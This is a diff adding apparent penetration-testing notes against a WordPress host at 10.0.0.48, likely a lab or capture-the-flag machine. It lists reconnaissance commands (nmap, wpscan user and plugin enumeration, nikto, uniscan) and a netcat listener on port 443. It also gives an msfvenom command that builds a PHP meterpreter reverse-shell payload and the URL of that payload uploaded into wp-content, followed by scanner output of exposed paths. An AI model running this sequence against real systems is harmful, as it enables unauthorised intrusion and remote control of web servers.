@@ -1,0 +1,60 @@
+1. nmap -T4 -A -v 10.0.0.40
+2. nc -v 10.0.0.48 110
+3. ncat -vv -n -l -p 443
+4. uniscan -u http:10.0.0.48/ -qweds
+5. wpscan —url http://10.0.0.48 —enumerate u
+6. wpscan —url http://10.0.0.48 —enumerate p
+7. nikto -h 10.0.0.48 -Display V -F htm -output niktoscan.html
+8. msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw > exploit.php
+
+http://10.0.0.48/wp-content/ksanchezphpexploit.php
+
+[URLS]
+
+- http://10.0.0.48/wakeup
+
+| Directory check:
+| [+] CODE: 200 URL: http://10.0.0.48/Image/
+| [+] CODE: 200 URL: http://10.0.0.48/admin/
+| [+] CODE: 200 URL: http://10.0.0.48/feed/
+| [+] CODE: 200 URL: http://10.0.0.48/image/
+| [+] CODE: 200 URL: http://10.0.0.48/login/
+| [+] CODE: 200 URL: http://10.0.0.48/rss/
+| [+] CODE: 200 URL: http://10.0.0.48/wp-login/
+| [+] CODE: 200 URL: http://10.0.0.48/wp-admin/
+
+| File check:
+| [+] CODE: 200 URL: http://10.0.0.48/admin/index.html
+| [+] CODE: 200 URL: http://10.0.0.48/admin/index.php
+| [+] CODE: 200 URL: http://10.0.0.48/favicon.ico
+| [+] CODE: 200 URL: http://10.0.0.48/index.html
+| [+] CODE: 200 URL: http://10.0.0.48/index.html%20
+| [+] CODE: 200 URL: http://10.0.0.48/index.php
+| [+] CODE: 200 URL: http://10.0.0.48/license.txt
+| [+] CODE: 200 URL: http://10.0.0.48/readme
+| [+] CODE: 200 URL: http://10.0.0.48/readme.html
+| [+] CODE: 200 URL: http://10.0.0.48/robots.txt
+| [+] CODE: 200 URL: http://10.0.0.48/search/htx/sqlqhit.asp
+| [+] CODE: 200 URL: http://10.0.0.48/search/htx/SQLQHit.asp
+| [+] CODE: 200 URL: http://10.0.0.48/search/SQLQHit.asp
+| [+] CODE: 200 URL: http://10.0.0.48/search/sqlqhit.asp
+| [+] CODE: 200 URL: http://10.0.0.48/sitemap.xml
+
+| Ignored Files: 
+| http://10.0.0.48/wp-admin/css/ie.min.css?ver=4.3.11
+| http://10.0.0.48/wp-admin/css/login.min.css?ver=4.3.11
+| http://10.0.0.48/wp-includes/css/dashicons.min.css?ver=4.3.11
+| http://10.0.0.48/wp-includes/js/jquery/jquery.js?ver=1.11.3
+| http://10.0.0.48/wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2
+| http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.11
+| http://10.0.0.48/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010
+| http://10.0.0.48/wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js?ver=20141010
+| http://10.0.0.48/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1
+| http://10.0.0.48/wp-admin/css/install.min.css?ver=4.3.11
+| http://10.0.0.48/wp-admin/css/install.css?ver=20100228
+| http://10.0.0.48/wp-includes/css/buttons.min.css?ver=4.3.11
+| http://10.0.0.48/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330
+| http://10.0.0.48/wp-includes/js/comment-reply.min.js?ver=4.3.11
+| http://10.0.0.48/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010
+| http://10.0.0.48/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010
+| http://10.0.0.48/wp-includes/wlwmanifest.xml
